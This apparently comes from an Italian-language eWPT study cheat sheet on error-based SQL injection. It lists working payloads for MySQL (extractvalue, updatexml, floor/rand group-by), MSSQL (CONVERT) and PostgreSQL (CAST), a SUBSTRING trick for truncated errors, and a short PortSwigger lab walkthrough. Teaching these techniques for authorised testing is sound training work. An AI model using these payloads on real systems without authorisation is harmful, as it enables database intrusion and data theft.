---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "Error-Based SQLi"
permalink: "/cheatsheet/ewpt/04-sql-injection/02-error-based-sqli/"
section: "SQL Injection"
section_order: 4
order: 2
sort_key: 402
---

**Difficoltà:** Intermediate
**Time to Master:** 2h
**Prerequisiti:** [01-SQLi-Fundamentals.md](/cheatsheet/ewpt/04-sql-injection/01-sqli-fundamentals/)
**Lab:** PortSwigger Academy: Error-based SQLi

---

## Obiettivo

Se l'app ti restituisce l'errore SQL grezzo in pagina, hai già mezzo lavoro fatto: puoi costruire query apposta malformate che, invece di fallire e basta, ti restituiscono il dato che vuoi dentro il messaggio di errore stesso. È una delle tecniche più dirette quando il debug mode è ancora acceso in produzione — capita più spesso di quanto pensi.

---

## Concetti chiave

### Perché funziona

Se l'applicazione mostra l'errore SQL grezzo nella pagina (debug mode attivo, cattiva gestione eccezioni), puoi costruire query che causano un errore contenente il dato che vuoi estrarre.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp Repeater | payload manuale | messaggio di errore con dato | principale |
| sqlmap | `--technique=E` | automatizza extraction | forza tecnica error-based |

---

## Payload / Esempi

### Esempio 1: MySQL, extractvalue/updatexml error-based

```sql
' AND extractvalue(1, concat(0x7e, (SELECT version()))) --
' AND updatexml(1, concat(0x7e, (SELECT database())), 1) --
```

**Output atteso:**
```
XPATH syntax error: '~8.0.31-0ubuntu0.20.04.1'
```

**Spiegazione:** `extractvalue`/`updatexml` si aspettano un XPath valido; forzando un valore non valido (prefissato con `~` per renderlo visibile), il messaggio di errore include il risultato della subquery. Limite importante: entrambe le funzioni troncano l'output a **32 caratteri**: per dati più lunghi serve estrarre a blocchi con `SUBSTRING` (vedi Evasion).

### Esempio 2: MySQL, double query error (floor/rand/group by)

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --
```

**Spiegazione:** tecnica classica basata su duplicate entry error in GROUP BY; utile quando extractvalue/updatexml sono filtrati.

### Esempio 3: MSSQL, conversion error

```sql
' AND 1=CONVERT(int, (SELECT @@version)) --
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --
```

**Output atteso:**
```
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int.
```

### Esempio 4: PostgreSQL, cast error

```sql
' AND 1=CAST((SELECT version()) AS int) --
```

---

## Evasion / Bypass Techniques

Se il messaggio di errore viene troncato, usa `SUBSTRING()`/`MID()` per estrarre il dato a blocchi:

```sql
' AND extractvalue(1, concat(0x7e, substring((SELECT version()),1,30))) --
' AND extractvalue(1, concat(0x7e, substring((SELECT version()),31,30))) --
```

---

## Lab Hands-On

### Lab 1: PortSwigger: SQL injection attack, querying database type and version (Oracle/non-Oracle)
**Obiettivo:** estrarre versione DB via error message
**Difficulty:** Medio
**Time:** 30 min

**Walkthrough breve:**
1. Conferma SQLi con test base
2. Costruisci payload extractvalue/updatexml (o CONVERT per MSSQL)
3. Leggi il dato dal messaggio di errore

---

## Common Mistakes

- Dimenticare il prefisso `0x7e` (`~`) prima del dato -> senza separatore visibile il dato si perde nel messaggio XPath
- Non troncare con SUBSTRING quando il messaggio di errore ha limite di lunghezza

---

## Link Utili

- [PortSwigger: Error-based SQLi](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings: SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## Connessioni

- **Prerequisito:** [01-SQLi-Fundamentals.md](/cheatsheet/ewpt/04-sql-injection/01-sqli-fundamentals/)
- **Prossimo Step:** [03-Union-Based-SQLi.md](/cheatsheet/ewpt/04-sql-injection/03-union-based-sqli/)

---

## Checklist di padronanza

- [ ] So costruire un payload extractvalue/updatexml funzionante
- [ ] Conosco l'equivalente per MSSQL (CONVERT) e PostgreSQL (CAST)
- [ ] So troncare l'estrazione con SUBSTRING quando serve
